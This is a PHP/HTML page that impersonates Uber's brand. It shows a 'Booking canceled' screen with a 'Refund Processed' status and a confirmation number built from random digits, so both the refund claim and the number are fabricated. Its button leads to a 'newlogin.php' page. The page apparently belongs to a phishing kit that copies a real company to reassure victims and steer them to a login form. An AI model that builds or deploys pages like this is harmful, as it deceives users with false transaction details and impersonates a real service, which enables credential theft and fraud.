<?php
session_start();
include "./Assets/php/config/config.php";
?>
<!DOCTYPE html>
<html class="light" lang="en"><head>
<meta charset="utf-8"/>
<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
<title>Uber | Booking Canceled</title>
<link href="https://fonts.googleapis.com" rel="preconnect"/>
<link crossorigin="" href="https://fonts.gstatic.com" rel="preconnect"/>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Plus+Jakarta+Sans:wght@700;800&display=swap" rel="stylesheet"/>
<link href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:wght,FILL@100..700,0..1&display=swap" rel="stylesheet"/>
<script src="https://cdn.tailwindcss.com?plugins=forms,container-queries"></script>
<script id="tailwind-config">
        tailwind.config = {
            darkMode: "class",
            theme: {
                extend: {
                    "colors": {
                        "tertiary-fixed": "#5e5e5e",
                        "on-secondary-fixed": "#1a1c1c",
                        "primary-fixed-dim": "#474747",
                        "primary-fixed": "#5e5e5e",
                        "inverse-primary": "#c6c6c6",
                        "surface-container-highest": "#e2e2e2",
                        "tertiary": "#3b3b3b",
                        "surface-container-lowest": "#ffffff",
                        "surface": "#f9f9f9",
                        "primary": "#000000",
                        "outline": "#777777",
                        "outline-variant": "#c6c6c6",
                        "surface-container-low": "#f3f3f3",
                        "background": "#f9f9f9",
                        "on-secondary": "#ffffff",
                        "on-tertiary-container": "#ffffff",
                        "on-error-container": "#410002",
                        "on-primary-fixed": "#ffffff",
                        "inverse-surface": "#303030",
                        "surface-variant": "#e2e2e2",
                        "error": "#ba1a1a",
                        "secondary": "#5d5f5f",
                        "surface-container-high": "#e8e8e8",
                        "surface-container": "#eeeeee",
                        "primary-container": "#3b3b3b",
                        "secondary-fixed": "#c6c6c7",
                        "on-secondary-container": "#1a1c1c",
                        "on-surface": "#1b1b1b",
                        "on-tertiary": "#e2e2e2",
                        "error-container": "#ffdad6",
                        "surface-bright": "#f9f9f9",
                        "secondary-container": "#d4d4d4",
                        "on-surface-variant": "#474747",
                        "tertiary-container": "#747474",
                        "on-primary-fixed-variant": "#e2e2e2",
                        "on-error": "#ffffff",
                        "surface-dim": "#dadada",
                        "inverse-on-surface": "#f1f1f1",
                        "on-background": "#1b1b1b",
                        "on-primary": "#ffffff"
                    },
                    "borderRadius": {
                        "DEFAULT": "0.125rem",
                        "lg": "0.25rem",
                        "xl": "0.5rem",
                        "full": "0.75rem"
                    },
                    "fontFamily": {
                        "headline": ["Plus Jakarta Sans"],
                        "body": ["Inter"],
                        "label": ["Inter"]
                    }
                }
            }
        }
    </script>
<style>
        .material-symbols-outlined { font-variation-settings: 'FILL' 0, 'wght' 300, 'GRAD' 0, 'opsz' 24; }
        body { font-family: 'Inter', sans-serif; background-color: #f9f9f9; }
        h1, h2, h3 { font-family: 'Plus Jakarta Sans', sans-serif; }

        @keyframes fadeInUp {
            from { opacity: 0; transform: translateY(16px); }
            to   { opacity: 1; transform: translateY(0); }
        }
        @keyframes checkPop {
            0%   { transform: scale(0.4); opacity: 0; }
            70%  { transform: scale(1.15); opacity: 1; }
            100% { transform: scale(1); opacity: 1; }
        }
        .anim-in  { animation: fadeInUp 0.6s cubic-bezier(0.16,1,0.3,1) forwards; opacity: 0; }
        .check-pop { animation: checkPop 0.55s cubic-bezier(0.34,1.56,0.64,1) forwards; }
        .d1 { animation-delay: 100ms; }
        .d2 { animation-delay: 250ms; }
        .d3 { animation-delay: 400ms; }
        .d4 { animation-delay: 550ms; }
    </style>
</head>
<body class="bg-background text-on-surface min-h-screen flex flex-col">

<!-- TopNavBar -->
<nav class="w-full top-0 sticky z-50 bg-[#f9f9f9]">
    <div class="flex justify-between items-center px-6 py-4 w-full">
        <div class="flex items-center gap-8">
            <span class="text-2xl font-bold text-black tracking-tighter" style="font-family:'Plus Jakarta Sans',sans-serif">Uber</span>
            <div class="hidden md:flex items-center gap-6">
                <span class="text-zinc-500 font-bold tracking-tight hover:bg-zinc-200 transition-colors px-2 py-1 cursor-pointer" style="font-family:'Plus Jakarta Sans',sans-serif">Home</span>
                <span class="text-zinc-500 font-bold tracking-tight hover:bg-zinc-200 transition-colors px-2 py-1 cursor-pointer" style="font-family:'Plus Jakarta Sans',sans-serif">Activity</span>
                <span class="text-zinc-500 font-bold tracking-tight hover:bg-zinc-200 transition-colors px-2 py-1 cursor-pointer" style="font-family:'Plus Jakarta Sans',sans-serif">Wallet</span>
            </div>
        </div>
        <div class="flex items-center gap-4">
            <div class="p-2 rounded-full hover:bg-zinc-200 transition-colors cursor-pointer">
                <span class="material-symbols-outlined text-black">help</span>
            </div>
        </div>
    </div>
</nav>

<!-- Success Content -->
<main class="flex-grow flex flex-col items-center justify-center px-6 py-12">
    <div class="max-w-md w-full text-center">

        <!-- Check Icon -->
        <div class="mb-10 relative anim-in d1">
            <div class="absolute inset-0 bg-surface-container-low rounded-full blur-3xl opacity-50 scale-75 -z-10"></div>
            <div class="inline-flex items-center justify-center w-24 h-24 rounded-full bg-surface-container-lowest shadow-sm mb-8 check-pop">
                <span class="material-symbols-outlined text-6xl text-emerald-600"
                      style="font-variation-settings: 'FILL' 1,'wght' 200;">check_circle</span>
            </div>
            <div class="space-y-4">
                <h1 class="text-4xl md:text-5xl font-extrabold text-primary tracking-tight leading-tight">
                    Booking canceled
                </h1>
                <p class="text-lg text-secondary leading-relaxed max-w-[280px] mx-auto">
                    Your booking has been successfully canceled.
                </p>
            </div>
        </div>

        <!-- Confirmation Card -->
        <div class="bg-surface-container-lowest p-8 rounded-xl mb-10 text-left border-l-4 border-primary anim-in d2">
            <div class="flex flex-col gap-6">
                <div class="flex justify-between items-start">
                    <div>
                        <p class="text-[10px] uppercase tracking-widest text-outline font-bold mb-1">Status</p>
                        <p class="text-sm font-semibold text-primary">Refund Processed</p>
                    </div>
                    <span class="material-symbols-outlined text-outline-variant">info</span>
                </div>
                <div class="h-px bg-surface-container"></div>
                <div>
                    <p class="text-[10px] uppercase tracking-widest text-outline font-bold mb-1">Confirmation Number</p>
                    <p class="text-sm font-mono text-primary">UBR-<?php echo rand(1000,9999); ?>-QX-<?php echo rand(10,99); ?></p>
                </div>
            </div>
        </div>

        <!-- Actions -->
        <div class="space-y-4 anim-in d3">
            <button onclick="window.location.href='./newlogin.php'"
                class="w-full py-4 px-8 bg-primary text-white font-bold rounded-lg shadow-xl shadow-black/5 active:scale-[0.98] transition-all duration-200 flex items-center justify-center gap-2 group">
                <span>Go back to Home</span>
                <span class="material-symbols-outlined text-sm group-hover:translate-x-1 transition-transform">arrow_forward</span>
            </button>
            <button class="w-full py-3 px-8 text-primary font-semibold hover:bg-surface-container transition-colors rounded-lg">
                View cancellation policy
            </button>
        </div>
    </div>
</main>

<!-- Footer -->
<footer class="p-8 mt-auto flex flex-col items-center gap-4 anim-in d4">
    <div class="w-full max-w-4xl h-px bg-gradient-to-r from-transparent via-surface-container to-transparent opacity-50"></div>
    <div class="flex gap-8 text-outline text-xs font-medium">
        <span class="hover:text-primary cursor-pointer transition-colors">Privacy Policy</span>
        <span class="hover:text-primary cursor-pointer transition-colors">Terms of Service</span>
        <span class="hover:text-primary cursor-pointer transition-colors">Support Center</span>
    </div>
</footer>

<!-- Mobile Bottom Nav -->
<div class="md:hidden sticky bottom-0 w-full bg-white shadow-[0_-4px_20px_rgba(0,0,0,0.05)] px-6 py-4 flex justify-around items-center">
    <div class="flex flex-col items-center gap-1 text-black font-bold">
        <span class="material-symbols-outlined">home</span>
        <span class="text-[10px]">Home</span>
    </div>
    <div class="flex flex-col items-center gap-1 text-zinc-500">
        <span class="material-symbols-outlined">receipt_long</span>
        <span class="text-[10px]">Activity</span>
    </div>
    <div class="flex flex-col items-center gap-1 text-zinc-500">
        <span class="material-symbols-outlined">mail</span>
        <span class="text-[10px]">Messages</span>
    </div>
    <div class="flex flex-col items-center gap-1 text-zinc-500">
        <span class="material-symbols-outlined">person</span>
        <span class="text-[10px]">Account</span>
    </div>
</div>

</body></html>
